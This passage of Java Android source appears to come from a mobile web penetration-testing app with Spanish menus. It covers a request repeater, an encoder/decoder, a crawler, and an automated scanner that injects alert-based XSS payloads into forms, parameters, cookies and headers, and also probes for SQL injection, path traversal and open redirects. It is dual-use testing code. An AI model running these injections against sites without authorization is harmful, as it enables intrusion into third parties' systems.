        addPanelButton("Copiar resultado al cuerpo del Repetidor", v -> { if (decoderOutput != null) { repeaterBody = decoderOutput; renderNow(); } });
    }

    private boolean hasHeader(java.util.Map<String, String> headers, String name) {
        for (String k : headers.keySet()) if (k.equalsIgnoreCase(name)) return true;
        return false;
    }

    private void sendRepeaterRequest() {
        String method = (repeaterMethod == null ? "GET" : repeaterMethod.trim().toUpperCase(java.util.Locale.ROOT));
        String rawUrl = repeaterUrl == null ? "" : repeaterUrl.trim();
        if (method.isEmpty()) method = "GET";
        if (rawUrl.isEmpty()) { Toast.makeText(this, "Escribe una URL", Toast.LENGTH_SHORT).show(); return; }
        if (repeaterSending) return;
        String url = buildRepeaterUrl(rawUrl.matches("^[a-zA-Z][a-zA-Z0-9+.-]*://.*") ? rawUrl : "https://" + rawUrl);
        repeaterSending = true;
        repeaterResult = "Enviando " + method + " " + shortUrl(url) + "…";
        renderNow();
        final String fMethod = method;
        final String fUrl = url;
        final String fHeaders = repeaterHeaders == null ? "" : repeaterHeaders;
        final String fBody = repeaterBody == null ? "" : repeaterBody;
        new Thread(() -> {
            long start = System.currentTimeMillis();
            String result;
            java.net.HttpURLConnection conn = null;
            try {
                conn = (java.net.HttpURLConnection) new java.net.URL(fUrl).openConnection();
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(15000);
                conn.setRequestMethod(fMethod);
                conn.setInstanceFollowRedirects(true);
                java.util.LinkedHashMap<String, String> headers = new java.util.LinkedHashMap<>();
                for (String line : fHeaders.split("\n")) {
                    int colon = line.indexOf(':');
                    if (colon > 0) headers.put(line.substring(0, colon).trim(), line.substring(colon + 1).trim());
                }
                if (!hasHeader(headers, "User-Agent")) headers.put("User-Agent", webView.getSettings().getUserAgentString());
                if (!hasHeader(headers, "Cookie")) {
                    String cookies = android.webkit.CookieManager.getInstance().getCookie(fUrl);
                    if (cookies != null && !cookies.isEmpty()) headers.put("Cookie", cookies);
                }
                byte[] bodyBytes = fBody.getBytes(java.nio.charset.StandardCharsets.UTF_8);
                boolean hasBody = bodyBytes.length > 0 && (fMethod.equals("POST") || fMethod.equals("PUT") || fMethod.equals("PATCH") || fMethod.equals("DELETE"));
                if (hasBody) {
                    if (!hasHeader(headers, "Content-Type")) headers.put("Content-Type", "application/x-www-form-urlencoded");
                    conn.setDoOutput(true);
                }
                for (java.util.Map.Entry<String, String> e : headers.entrySet()) conn.setRequestProperty(e.getKey(), e.getValue());
                if (hasBody) {
                    conn.setFixedLengthStreamingMode(bodyBytes.length);
                    java.io.OutputStream out = conn.getOutputStream();
                    out.write(bodyBytes);
                    out.close();
                }
                int code = conn.getResponseCode();
                long ms = System.currentTimeMillis() - start;
                java.io.InputStream in;
                try { in = conn.getInputStream(); } catch (Exception e) { in = conn.getErrorStream(); }
                byte[] raw = new byte[0];
                if (in != null) {
                    java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream();
                    byte[] chunk = new byte[8192];
                    int read;
                    int total = 0;
                    while ((read = in.read(chunk)) != -1 && total < 64 * 1024) { buf.write(chunk, 0, read); total += read; }
                    in.close();
                    raw = buf.toByteArray();
                }
                String body = new String(raw, java.nio.charset.StandardCharsets.UTF_8);
                StringBuilder out = new StringBuilder();
                out.append("HTTP ").append(code).append("  •  ").append(ms).append(" ms  •  ").append(raw.length).append(" bytes\n");
                out.append("URL final: ").append(conn.getURL()).append("\n");
                out.append("Cabeceras de respuesta:\n");
                java.util.Map<String, java.util.List<String>> respHeaders = conn.getHeaderFields();
                int shown = 0;
                if (respHeaders != null) {
                    for (java.util.Map.Entry<String, java.util.List<String>> e : respHeaders.entrySet()) {
                        if (shown >= 20) break;
                        out.append(e.getKey() == null ? "Estado" : e.getKey()).append(": ").append(e.getValue()).append("\n");
                        shown++;
                    }
                }
                out.append("\nCuerpo");
                if (raw.length > 4000) out.append(" (primeros 4000 caracteres de ").append(raw.length).append(" bytes)");
                out.append(":\n").append(body.length() > 4000 ? body.substring(0, 4000) : body);
                result = out.toString();
            } catch (Exception e) {
                result = "No se pudo enviar la petición: " + e.getMessage();
            } finally {
                if (conn != null) conn.disconnect();
            }
            final String finalResult = result;
            runOnUiThread(() -> {
                repeaterSending = false;
                repeaterResult = finalResult;
                if (activePanel.equals("REPETIDOR")) renderNow();
            });
        }).start();
    }

    private void runDecoder(String op) {
        String input = decoderInput == null ? "" : decoderInput;
        try {
            switch (op) {
                case "b64e": decoderOutput = android.util.Base64.encodeToString(input.getBytes(java.nio.charset.StandardCharsets.UTF_8), android.util.Base64.NO_WRAP); break;
                case "b64d": decoderOutput = new String(android.util.Base64.decode(input.trim(), android.util.Base64.DEFAULT), java.nio.charset.StandardCharsets.UTF_8); break;
                case "urle": decoderOutput = java.net.URLEncoder.encode(input, "UTF-8"); break;
                case "urld": decoderOutput = java.net.URLDecoder.decode(input, "UTF-8"); break;
                case "htmle": decoderOutput = htmlEncode(input); break;
                case "htmld": decoderOutput = htmlDecode(input); break;
                case "hexe": decoderOutput = hexEncode(input); break;
                case "hexd": decoderOutput = hexDecode(input); break;
                default: decoderOutput = "Operación desconocida.";
            }
        } catch (Exception e) {
            decoderOutput = "No se pudo aplicar la operación: " + e.getMessage();
        }
        renderNow();
    }

    private String htmlEncode(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;");
    }

    private String htmlDecode(String s) {
        String out = s.replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'").replace("&apos;", "'").replace("&amp;", "&");
        java.util.regex.Matcher m = java.util.regex.Pattern.compile("&#(\\d+);").matcher(out);
        StringBuffer sb = new StringBuffer();
        while (m.find()) {
            try { m.appendReplacement(sb, java.util.regex.Matcher.quoteReplacement(String.valueOf((char) Integer.parseInt(m.group(1))))); }
            catch (Exception ignored) { }
        }
        m.appendTail(sb);
        return sb.toString();
    }

    private String hexEncode(String s) {
        byte[] b = s.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        StringBuilder out = new StringBuilder();
        for (byte v : b) out.append(String.format(java.util.Locale.US, "%02x", v));
        return out.toString();
    }

    private String hexDecode(String s) {
        String t = s.replaceAll("\\s+", "");
        if (t.length() % 2 != 0) throw new IllegalArgumentException("longitud impar: el hexadecimal va de dos en dos");
        byte[] b = new byte[t.length() / 2];
        for (int i = 0; i < b.length; i++) b[i] = (byte) Integer.parseInt(t.substring(i * 2, i * 2 + 2), 16);
        return new String(b, java.nio.charset.StandardCharsets.UTF_8);
    }

    // Escaneo automático y autollenado (v2.0). El escaneo encadena los
    // pasos que antes se hacían a mano: descubrir entradas, enviar el
    // canario a cada una (máx. 8), probar payloads en las que reflejan
    // (máx. 4, según el contexto detectado), sondear caracteres, revisar
    // CSP y cookies, y probar el WAF. Cada paso se completa con los mismos
    // callbacks de las pruebas manuales; si un paso no responde en 12 s,
    // un vigilante lo salta y sigue con el siguiente. El autollenado
    // rellena los formularios de la página con el canario o con datos de
    // prueba según el tipo de campo, sin escribir a mano.
    private void showScanSection() {
        addPanelText("Un toque ejecuta toda la secuencia: descubrir entradas, enviar el canario a cada una, probar payloads en las que reflejan, sondear caracteres, revisar CSP y cookies, y probar el WAF. Al final muestra los hallazgos con severidad.", Color.LTGRAY);
        addPanelButton(scanRunning ? "Detener escaneo" : "Iniciar escaneo automático", v -> { if (scanRunning) stopScan(); else startScan(); });
        if (scanStatus != null) addPanelText(scanStatus, Color.WHITE);
        if (!scanFindings.isEmpty()) {
            StringBuilder out = new StringBuilder("Hallazgos:\n");
            for (String f : scanFindings) out.append("• ").append(f).append("\n");
            addPanelText(out.toString(), Color.rgb(215, 220, 230));
        }
    }

    private void startScan() {
        if (scanRunning) return;
        if (webView.getUrl() == null) { Toast.makeText(this, "Carga una página primero", Toast.LENGTH_SHORT).show(); return; }
        scanRunning = true;
        scanAwaitingDiscover = true;
        scanFindings.clear();
        scanSteps.clear();
        scanStepIndex = 0;
        scanStepId = 0;
        scanReflected = 0;
        scanVuln = 0;
        scanSteps.add("discover");
        scanStatus = "Escaneo iniciado…";
        renderNow();
        runNextScanStep();
    }

    private void stopScan() {
        scanRunning = false;
        coveragePendingTest = null;
        coveragePendingKind = null;
        xssTestActive = false;
        scanStatus = "Escaneo detenido por el usuario en el paso " + scanStepIndex + "/" + scanSteps.size() + ".";
        if (activePanel.equals("OWASP")) renderNow();
    }

    private void addScanFinding(String finding) {
        if (scanFindings.size() >= 20) return;
        scanFindings.add(finding);
    }

    private void advanceScanForStep(int stepId) {
        if (!scanRunning) return;
        if (stepId != scanCurrentId) return;
        runNextScanStep();
    }

    private void armScanWatchdog() {
        final int id = scanCurrentId;
        webView.postDelayed(() -> {
            if (scanRunning && scanCurrentId == id) {
                scanStatus = "Paso sin respuesta tras 12 s, continuando…";
                runNextScanStep();
            }
        }, 12000);
    }

    private void runNextScanStep() {
        if (!scanRunning) return;
        while (scanStepIndex < scanSteps.size()) {
            String step = scanSteps.get(scanStepIndex++);
            scanStepId++;
            scanCurrentId = scanStepId;
            scanStatus = "Paso " + scanStepIndex + "/" + scanSteps.size() + ": " + scanStepLabel(step);
            if (step.equals("discover")) {
                if (coverageInputsJson != null) { buildScanCanarySteps(); continue; }
                armScanWatchdog();
                discoverEntryPoints();
                if (activePanel.equals("OWASP")) renderNow();
                return;
            }
            if (step.equals("build-payload-steps")) { buildScanPayloadSteps(); continue; }
            if (step.equals("probe")) { armScanWatchdog(); sendProbeViaUrl(); if (activePanel.equals("OWASP")) renderNow(); return; }
            if (step.equals("headers")) { armScanWatchdog(); analyzeHeaders(); if (activePanel.equals("OWASP")) renderNow(); return; }
            if (step.equals("waf")) { armScanWatchdog(); testWaf(); if (activePanel.equals("OWASP")) renderNow(); return; }
            if (step.equals("sqli")) { armScanWatchdog(); runScanProbes("sqli"); if (activePanel.equals("OWASP")) renderNow(); return; }
            if (step.equals("traversal")) { armScanWatchdog(); runScanProbes("traversal"); if (activePanel.equals("OWASP")) renderNow(); return; }
            if (step.equals("redirect")) { armScanWatchdog(); runScanProbes("redirect"); if (activePanel.equals("OWASP")) renderNow(); return; }
            if (step.startsWith("canary:")) { armScanWatchdog(); testEntryPoint(step.substring(7)); if (activePanel.equals("OWASP")) renderNow(); return; }
            if (step.startsWith("payload:")) { armScanWatchdog(); sendScanPayload(step.substring(8)); if (activePanel.equals("OWASP")) renderNow(); return; }
        }
        finishScan();
    }

    private String scanStepLabel(String step) {
        if (step.equals("discover")) return "descubriendo puntos de entrada";
        if (step.equals("build-payload-steps")) return "eligiendo payloads para los puntos reflejados";
        if (step.equals("probe")) return "sondeando caracteres críticos";
        if (step.equals("headers")) return "analizando CSP y cookies";
        if (step.equals("waf")) return "probando WAF";
        if (step.equals("sqli")) return "probando inyección SQL";
        if (step.equals("traversal")) return "probando path traversal";
        if (step.equals("redirect")) return "probando redirección abierta";
        if (step.startsWith("canary:")) return "enviando canario a " + step.substring(7);
        if (step.startsWith("payload:")) return "probando payload en " + step.substring(8);
        return step;
    }

    private void buildScanCanarySteps() {
        int added = 0;
        for (String f : coverageFormFields) {
            if (added >= 8) break;
            String[] parts = f.split("\\|", -1);
            if (parts.length < 3) continue;
            scanSteps.add("canary:" + ("POST".equals(parts[2]) ? "post:" : "form:") + parts[0] + ":" + parts[1]);
            added++;
        }
        for (String p : coverageGetParams) {
            if (added >= 8) break;
            scanSteps.add("canary:get:" + p);
            added++;
        }
        for (String c : coverageCookies) {
            if (added >= 8) break;
            scanSteps.add("canary:cookie:" + c);
            added++;
        }
        if (added < 8) { scanSteps.add("canary:header:User-Agent"); added++; }
        if (added < 8) { scanSteps.add("canary:header:Referer"); added++; }
        for (String j : coverageJsonFields) {
            if (added >= 8) break;
            scanSteps.add("canary:json:" + j);
            added++;
        }
        scanSteps.add("build-payload-steps");
        scanSteps.add("probe");
        scanSteps.add("headers");
        scanSteps.add("waf");
        scanSteps.add("sqli");
        scanSteps.add("traversal");
        scanSteps.add("redirect");
    }

    private void buildScanPayloadSteps() {
        int inserted = 0;
        for (java.util.Map.Entry<String, String> e : coverageResults.entrySet()) {
            if (inserted >= 4) break;
            if (e.getValue() != null && e.getValue().startsWith("Canario encontrado")) {
                scanSteps.add(scanStepIndex, "payload:" + e.getKey());
                inserted++;
            }
        }
    }

    private String payloadForContext(String ctx) {
        if ("atributo".equals(ctx)) return firstLibraryPayload("Contexto atributo");
        if ("script".equals(ctx)) return firstLibraryPayload("Contexto script / CSS");
        if ("css".equals(ctx)) return "</style><script>alert(document.domain)</script>";
        return "<img src=x onerror=alert(document.domain)>";
    }

    private void sendScanPayload(String key) {
        String payload = payloadForContext(coverageContexts.get(key));
        xssAlertText = null;
        xssTestActive = true;
        if (key.startsWith("get:")) {
            String name = key.substring(4);
            armPendingTest(key, "scanpayload");
            String js = "(function(){var u = new URL(location.href); u.searchParams.set(" + org.json.JSONObject.quote(name) + ", " + org.json.JSONObject.quote(payload) + "); location.href = u.toString();})()";
            webView.evaluateJavascript(js, null);
        } else if (key.startsWith("form:") || key.startsWith("post:")) {
            String[] parts = key.split(":", 3);
            if (parts.length < 3) { xssTestActive = false; advanceScanForStep(scanCurrentId); return; }
            armPendingTest(key, "scanpayload");
            String js = "(function(){var f = document.forms[" + parts[1] + "]; if (!f) return 'sin formulario';"
                    + "var els = f.elements[" + org.json.JSONObject.quote(parts[2]) + "];"
                    + "if (!els) return 'sin campo';"
                    + "var el = (els.length !== undefined && els.tagName === undefined) ? els[0] : els;"
                    + "el.value = " + org.json.JSONObject.quote(payload) + ";"
                    + "f.submit(); return 'ok';})()";
            webView.evaluateJavascript(js, null);
        } else if (key.startsWith("cookie:")) {
            String name = key.substring(7);
            String url = webView.getUrl();
            if (url == null) { xssTestActive = false; advanceScanForStep(scanCurrentId); return; }
            android.webkit.CookieManager.getInstance().setCookie(url, name + "=" + Uri.encode(payload) + "; Path=/");
            android.webkit.CookieManager.getInstance().flush();
            armPendingTest(key, "scanpayload");
            webView.reload();
        } else if (key.equals("header:User-Agent")) {
            if (coverageUaBackup == null) coverageUaBackup = webView.getSettings().getUserAgentString();
            webView.getSettings().setUserAgentString(payload);
            armPendingTest(key, "scanpayload");
            webView.reload();
        } else if (key.equals("header:Referer")) {
            String url = webView.getUrl();
            if (url == null) { xssTestActive = false; advanceScanForStep(scanCurrentId); return; }
            java.util.HashMap<String, String> headers = new java.util.HashMap<>();
            headers.put("Referer", payload);
            armPendingTest(key, "scanpayload");
            webView.loadUrl(url, headers);
        } else if (key.startsWith("json:")) {
            String field = key.substring(5);
            String qField = org.json.JSONObject.quote(field);
            String js = "(function(){var n = 0;"
                    + "document.querySelectorAll('script[type=\"application/json\"]').forEach(function(s){"
                    + "try { var o = JSON.parse(s.textContent); if (" + qField + " in o) { o[" + qField + "] = " + org.json.JSONObject.quote(payload) + "; s.textContent = JSON.stringify(o); n++; } } catch(e){} });"
                    + "return n;})()";
            webView.evaluateJavascript(js, value -> webView.postDelayed(() -> completeScanPayload(key), 1200));
        } else {
            xssTestActive = false;
            advanceScanForStep(scanCurrentId);
        }
    }

    private void completeScanPayload(String key) {
        boolean vuln = xssAlertText != null;
        xssTestActive = false;
        coverageResults.put(key, vuln ? "VULNERABLE — el payload ejecutó JavaScript" : "sin ejecución");
        if (vuln) { scanVuln++; addScanFinding("[ALTO] XSS ejecutado en " + key); }
        xssAlertText = null;
        if (scanRunning) advanceScanForStep(scanCurrentId);
        else if (activePanel.equals("OWASP")) renderNow();
    }

    private void finishScan() {
        scanRunning = false;
        StringBuilder out = new StringBuilder();
        out.append("Escaneo terminado. Puntos probados: ").append(coverageTested.size())
           .append("  •  Reflejados: ").append(scanReflected)
           .append("  •  Con ejecución XSS: ").append(scanVuln)
           .append("  •  Hallazgos: ").append(scanFindings.size()).append("\n");
        if (scanFindings.isEmpty()) out.append("Sin hallazgos de ejecución. Los puntos reflejados están en Cobertura para probar otros payloads a mano.");
        scanStatus = out.toString();
        if (activePanel.equals("OWASP")) renderNow();
    }

    private void showAutofillSection() {
        addPanelText("Llena los formularios de la página sin escribir a mano: con el canario para probar reflejos, o con datos de prueba realistas según el tipo de campo.", Color.LTGRAY);
        addPanelButton("Llenar formularios con el canario", v -> autofillForms(true));
        addPanelButton("Llenar formularios con datos de prueba", v -> autofillForms(false));
        addPanelButton("Llenar y enviar el primer formulario (canario)", v -> autofillAndSubmitFirstForm());
        if (autofillResults != null) addPanelText(autofillResults, Color.rgb(215, 220, 230));
    }

    private void autofillForms(boolean useCanary) {
        String token = useCanary ? canaryToken.trim() : null;
        if (useCanary && (token == null || token.isEmpty())) { Toast.makeText(this, "Escribe un canario primero", Toast.LENGTH_SHORT).show(); return; }
        final String fToken = token;
        String js = "JSON.stringify((function(){"
                + "var n = 0;"
                + "for (var i = 0; i < document.forms.length; i++) {"
                + "var f = document.forms[i];"
                + "for (var j = 0; j < f.elements.length; j++) {"
                + "var el = f.elements[j];"
                + "if (!el.name || el.disabled || el.readOnly) continue;"
                + "var tag = el.tagName; var type = (el.type || '').toLowerCase();"
                + "if (tag === 'SELECT') { if (el.options.length > 1) { el.selectedIndex = 1; n++; } continue; }"
                + "if (type === 'checkbox' || type === 'radio') { if (!el.checked) { el.checked = true; n++; } continue; }"
                + "if (type === 'submit' || type === 'button' || type === 'hidden' || type === 'file') continue;"
                + "var name = el.name.toLowerCase();"
                + "var value = " + (useCanary ? org.json.JSONObject.quote(token) : "null") + ";"
                + "if (value === null) {"
                + "if (type === 'email' || name.indexOf('mail') >= 0) value = 'prueba@example.com';"
                + "else if (type === 'password' || name.indexOf('pass') >= 0) value = 'Prueba123!';"
                + "else if (type === 'tel' || name.indexOf('tel') >= 0 || name.indexOf('phone') >= 0) value = '5551234567';"
                + "else if (type === 'number' || type === 'range') value = '123';"
                + "else if (type === 'date') value = '2026-01-15';"
                + "else if (type === 'url' || name.indexOf('url') >= 0 || name.indexOf('web') >= 0) value = 'https://example.com';"
                + "else if (name.indexOf('nombre') >= 0 || name.indexOf('name') >= 0) value = 'Prueba Usuario';"
                + "else if (tag === 'TEXTAREA') value = 'Texto de prueba para el formulario.';"
                + "else value = 'prueba';"
                + "}"
                + "el.value = value; n++;"
                + "}"
                + "}"
                + "return {forms: document.forms.length, fields: n};"
                + "})())";
        webView.evaluateJavascript(js, value -> {
            try {
                org.json.JSONObject data = new org.json.JSONObject(unquote(value));
                autofillResults = "Autollenado: " + data.optInt("fields") + " campos en " + data.optInt("forms") + " formulario(s)" + (useCanary ? " con el canario «" + fToken + "»." : " con datos de prueba.");
            } catch (Exception e) {
                autofillResults = "No se pudo llenar los formularios.";
            }
            if (activePanel.equals("OWASP")) renderNow();
        });
    }

    private void autofillAndSubmitFirstForm() {
        if (!checkCanary()) return;
        autofillResults = "Primer formulario llenado con el canario y enviado. El reflejo aparecerá en la sección Canario.";
        armPendingTest("canary:form", "canary");
        String js = "(function(){if (!document.forms.length) return 'sin formularios';"
                + "var f = document.forms[0];"
                + "for (var i = 0; i < f.elements.length; i++) { var el = f.elements[i]; if (el.name && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') && el.type !== 'submit' && el.type !== 'button' && el.type !== 'checkbox' && el.type !== 'radio' && el.type !== 'hidden' && el.type !== 'file') { el.value = " + org.json.JSONObject.quote(canaryToken.trim()) + "; } }"
                + "f.submit(); return 'ok';})()";
        webView.evaluateJavascript(js, value -> {
            if ("sin formularios".equals(unquote(value))) {
                coveragePendingTest = null;
                coveragePendingKind = null;
                autofillResults = "La página no tiene formularios.";
                if (activePanel.equals("OWASP")) renderNow();
            }
        });
        renderNow();
    }

    private void repeaterTestWith(String value, boolean asBody) {
        if (value == null || value.isEmpty()) { Toast.makeText(this, "No hay valor para probar", Toast.LENGTH_SHORT).show(); return; }
        if (asBody) {
            repeaterBody = value;
            String m = repeaterMethod == null ? "" : repeaterMethod.trim().toUpperCase(java.util.Locale.ROOT);
            if (!m.equals("POST") && !m.equals("PUT") && !m.equals("PATCH")) repeaterMethod = "POST";
        } else {
            String base = repeaterUrl == null ? "" : repeaterUrl.trim();
            if (base.isEmpty()) { Toast.makeText(this, "Escribe una URL primero", Toast.LENGTH_SHORT).show(); return; }
            if (!base.matches("^[a-zA-Z][a-zA-Z0-9+.-]*://.*")) base = "https://" + base;
            int q = base.indexOf('?');
            if (q >= 0) base = base.substring(0, q);
            repeaterUrl = base;
            repeaterParams.clear();
            repeaterParams.add(new String[]{"q", value});
        }
        sendRepeaterRequest();
    }

    // Parámetros del Repetidor (v2.1). La URL queda en su campo sin
    // consulta y los parámetros viven en filas editables nombre/valor;
    // al enviar se reconstruye la URL con los parámetros codificados.
    // Al tocar una petición del registro de red, su método y su URL se
    // cargan, su consulta se parte en parámetros editables y la petición
    // se ejecuta de inmediato.
    private EditText paramEditText(String text, String hint) {
        EditText input = new EditText(this);
        input.setSingleLine(true);
        input.setTextColor(Color.WHITE);
        input.setHintTextColor(Color.LTGRAY);
        input.setHint(hint);
        input.setTextSize(12);
        input.setPadding(dp(8), dp(6), dp(8), dp(6));
        input.setBackgroundColor(Color.rgb(43, 48, 58));
        input.setText(text == null ? "" : text);
        return input;
    }

    private String buildRepeaterUrl(String url) {
        if (repeaterParams == null || repeaterParams.isEmpty()) return url;
        int q = url.indexOf('?');
        String base = q >= 0 ? url.substring(0, q) : url;
        int h = base.indexOf('#');
        if (h >= 0) base = base.substring(0, h);
        StringBuilder out = new StringBuilder(base);
        boolean first = true;
        for (String[] p : repeaterParams) {
            try {
                out.append(first ? '?' : '&');
                first = false;
                out.append(java.net.URLEncoder.encode(p[0] == null ? "" : p[0], "UTF-8"));
                out.append('=');
                out.append(java.net.URLEncoder.encode(p[1] == null ? "" : p[1], "UTF-8"));
            } catch (Exception ignored) { }
        }
        return out.toString();
    }

    private void loadRecentRequest(String method, String url) {
        repeaterMethod = method;
        repeaterParams.clear();
        String full = url == null ? "" : url;
        if (!full.matches("^[a-zA-Z][a-zA-Z0-9+.-]*://.*")) full = "https://" + full;
        int q = full.indexOf('?');
        if (q >= 0) {
            repeaterUrl = full.substring(0, q);
            String query = full.substring(q + 1);
            int h = query.indexOf('#');
            if (h >= 0) query = query.substring(0, h);
            for (String pair : query.split("&")) {
                if (pair.isEmpty()) continue;
                int eq = pair.indexOf('=');
                try {
                    String name = eq >= 0 ? java.net.URLDecoder.decode(pair.substring(0, eq), "UTF-8") : java.net.URLDecoder.decode(pair, "UTF-8");
                    String value = eq >= 0 ? java.net.URLDecoder.decode(pair.substring(eq + 1), "UTF-8") : "";
                    repeaterParams.add(new String[]{name, value});
                } catch (Exception ignored) { }
            }
        } else {
            repeaterUrl = full;
        }
    }

    private void loadParamsFromUrl() {
        String raw = repeaterUrl == null ? "" : repeaterUrl.trim();
        if (raw.isEmpty()) { Toast.makeText(this, "Escribe una URL primero", Toast.LENGTH_SHORT).show(); return; }
        if (!raw.matches("^[a-zA-Z][a-zA-Z0-9+.-]*://.*")) raw = "https://" + raw;
        repeaterParams.clear();
        int q = raw.indexOf('?');
        if (q >= 0) {
            repeaterUrl = raw.substring(0, q);
            String query = raw.substring(q + 1);
            int h = query.indexOf('#');
            if (h >= 0) query = query.substring(0, h);
            for (String pair : query.split("&")) {
                if (pair.isEmpty()) continue;
                int eq = pair.indexOf('=');
                try {
                    String name = eq >= 0 ? java.net.URLDecoder.decode(pair.substring(0, eq), "UTF-8") : java.net.URLDecoder.decode(pair, "UTF-8");
                    String value = eq >= 0 ? java.net.URLDecoder.decode(pair.substring(eq + 1), "UTF-8") : "";
                    repeaterParams.add(new String[]{name, value});
                } catch (Exception ignored) { }
            }
            Toast.makeText(this, repeaterParams.size() + " parámetro(s) cargado(s)", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "La URL no tiene parámetros", Toast.LENGTH_SHORT).show();
        }
        renderNow();
    }

    // Recon, Reporte, Intruso y sondas ampliadas del escaneo (v3.0).
    // Recon agrupa DNS, mapa del sitio, tecnologías y almacenamiento del
    // sitio; Reporte reúne los hallazgos del escaneo y del Intruso. El
    // Intruso ataca un parámetro de la URL del Repetidor con una lista de
    // payloads y compara cada respuesta con la original. Las sondas del
    // escaneo prueban SQLi, path traversal y redirección abierta con
    // peticiones directas y buscan firmas de error en el cuerpo.
    private void reconSection(String key, String title) {
        addPanelButton((reconExpanded.contains(key) ? "▼ " : "▶ ") + title, v -> {
            if (reconExpanded.contains(key)) reconExpanded.remove(key); else reconExpanded.add(key);
            renderNow();
        });
    }

    private void showReconPanel() {
        addPanelText("Recon · reconocimiento del sitio", Color.rgb(105, 205, 255));
        addPanelText("DNS, mapa del sitio, tecnologías y almacenamiento. Toca cada sección para desplegarla.", Color.LTGRAY);
        reconSection("DNS", "DNS · dominio y hosts");
        if (reconExpanded.contains("DNS")) showDnsPanel();
        reconSection("MAPA", "Mapa del sitio · rastreador");
        if (reconExpanded.contains("MAPA")) showCrawlSection();
        reconSection("TEC", "Tecnologías · servidor y stack");
        if (reconExpanded.contains("TEC")) showTechSection();
        reconSection("DATOS", "Almacenamiento del sitio");
        if (reconExpanded.contains("DATOS")) {
            addPanelText("Almacenamiento del dominio actual", Color.LTGRAY);
            addPanelButton("Ver localStorage y sessionStorage", v -> inspectStorage());
            addPanelButton("Borrar almacenamiento y cookies de este sitio", v -> clearSiteData());
        }
    }

    private void showCrawlSection() {
        addPanelText("Recorre los enlaces del mismo dominio (profundidad 2, máx. 30 URLs) y lista cada URL con su estado. Toca una URL para abrirla en el navegador y probarla.", Color.LTGRAY);
        addPanelButton(crawlRunning ? "Detener rastreo" : "Explorar sitio", v -> { if (crawlRunning) crawlRunning = false; else crawlSite(); });
        if (crawlStatus != null) addPanelText(crawlStatus, Color.WHITE);
        if (!crawlResults.isEmpty()) {
            for (String[] row : crawlResults) {
                final String url = row[0];
                addPanelButton(row[1] + "  " + shortUrl(url), v -> navigate(url));
            }
        }
    }

    private void crawlSite() {
        String start = webView.getUrl();
        if (start == null) { Toast.makeText(this, "Carga una página primero", Toast.LENGTH_SHORT).show(); return; }
        crawlRunning = true;
        crawlResults.clear();
        crawlStatus = "Rastreando " + shortUrl(start) + "…";
        renderNow();
        final String startUrl = start;
        new Thread(() -> {
            java.util.LinkedHashSet<String> visited = new java.util.LinkedHashSet<>();
            java.util.ArrayDeque<String[]> queue = new java.util.ArrayDeque<>();
            queue.add(new String[]{startUrl, "0"});
            String host;
            try { host = new java.net.URL(startUrl).getHost(); } catch (Exception e) { host = ""; }
            final String fHost = host;
            while (crawlRunning && !queue.isEmpty() && visited.size() < 30) {
                String[] item = queue.poll();
                String url = item[0];
                int depth = Integer.parseInt(item[1]);
                if (visited.contains(url)) continue;
                visited.add(url);
                int code = -1;
                String body = "";
                java.net.HttpURLConnection conn = null;
                try {
                    conn = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
                    conn.setConnectTimeout(6000);
                    conn.setReadTimeout(8000);
                    conn.setRequestProperty("User-Agent", webView.getSettings().getUserAgentString());
                    conn.setInstanceFollowRedirects(true);
                    code = conn.getResponseCode();
                    java.io.InputStream in;
                    try { in = conn.getInputStream(); } catch (Exception e) { in = conn.getErrorStream(); }
                    if (in != null) {
                        java.io.ByteArrayOutputStream buf = new java.io.ByteArrayOutputStream();
                        byte[] chunk = new byte[8192];
                        int read, total = 0;
                        while ((read = in.read(chunk)) != -1 && total < 256 * 1024) { buf.write(chunk, 0, read); total += read; }
                        in.close();
                        body = new String(buf.toByteArray(), java.nio.charset.StandardCharsets.UTF_8);
                    }
                } catch (Exception ignored) { } finally { if (conn != null) conn.disconnect(); }
                final int fCode = code;
                final String fUrl = url;
                runOnUiThread(() -> {
                    crawlResults.add(new String[]{fUrl, fCode < 0 ? "sin respuesta" : ("HTTP " + fCode)});
                    crawlStatus = "Rastreadas " + crawlResults.size() + " URLs…";
                    if (activePanel.equals("RECON")) renderNow();
                });
                if (depth < 2 && code == 200 && !body.isEmpty()) {
                    java.util.regex.Matcher m = java.util.regex.Pattern.compile("(?:href|action)\\s*=\\s*[\"']([^\"'#>]+)[\"']").matcher(body);
                    while (m.find() && queue.size() < 60) {
                        try {
                            java.net.URL abs = new java.net.URL(new java.net.URL(url), m.group(1));
                            if (!"http".equals(abs.getProtocol()) && !"https".equals(abs.getProtocol())) continue;
                            if (!host.equals(abs.getHost())) continue;
                            String clean = abs.toString().split("#")[0];
                            if (!visited.contains(clean)) queue.add(new String[]{clean, String.valueOf(depth + 1)});
                        } catch (Exception ignored) { }
                    }
                }
                try { Thread.sleep(400); } catch (InterruptedException ignored) { }
            }
            crawlRunning = false;
            runOnUiThread(() -> {
                crawlStatus = "Rastreo terminado: " + crawlResults.size() + " URLs del dominio " + fHost + ".";
                if (activePanel.equals("RECON")) renderNow();
            });
        }).start();
    }

    private void showTechSection() {
        addPanelText("Detecta el servidor, el framework y las librerías por las cabeceras y el HTML de la página actual.", Color.LTGRAY);
        addPanelButton(techAnalyzing ? "Analizando…" : "Detectar tecnologías", v -> detectTech());
        if (techResults != null) addPanelText(techResults, Color.rgb(215, 220, 230));
    }

    private void detectTech() {
        String url = webView.getUrl();
        if (url == null) { Toast.makeText(this, "Carga una página primero", Toast.LENGTH_SHORT).show(); return; }
        if (techAnalyzing) return;
        techAnalyzing = true;
        techResults = "Analizando " + shortUrl(url) + "…";
        renderNow();
        final String target = url;
        new Thread(() -> {
            String server = null, poweredBy = null, generator = null;
            java.util.ArrayList<String> libs = new java.util.ArrayList<>();
            String error = null;
            java.net.HttpURLConnection conn = null;
            try {
                conn = (java.net.HttpURLConnection) new java.net.URL(target).openConnection();
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("User-Agent", webView.getSettings().getUserAgentString());
                conn.setInstanceFollowRedirects(true);
                conn.connect();
